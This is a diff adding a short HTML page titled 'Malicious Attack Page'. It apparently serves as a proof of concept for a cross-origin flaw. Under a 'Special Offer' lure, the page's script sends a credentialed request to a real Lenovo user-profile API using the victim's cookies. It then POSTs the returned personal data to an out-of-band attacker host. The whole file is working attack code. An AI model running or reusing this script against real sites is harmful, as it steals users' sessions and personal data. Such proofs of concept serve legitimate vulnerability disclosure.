@@ -1,0 +1,28 @@
+<html>
+  <head><title>Malicious Attack Page</title></head>
+  <body>
+    <h1>Special Offer! Click Here</h1>
+    <script>
+      // Malicious script to send a cross-origin request using victim's session
+      fetch('https://ovp.lenovo.com/dxp/api/sacs/v1/user/profile', {
+        method: 'GET',
+        headers: {
+          'Origin': 'https://gszrizdgtpjwtixdhtfmpe9fvqozas2ny.oast.fun',
+          'Accept': 'application/json',
+        },
+        credentials: 'include' // Send cookies (session) with the request
+      })
+      .then(response => response.json())
+      .then(data => {
+        // Exfiltrate the PII
+        fetch('https://gszrizdgtpjwtixdhtfmpe9fvqozas2ny.oast.fun/exfiltrate', {
+          method: 'POST',
+          body: JSON.stringify(data), // Send PII to the attacker's server
+          headers: {
+            'Content-Type': 'application/json',
+          }
+        });
+      });
+    </script>
+  </body>
+</html>
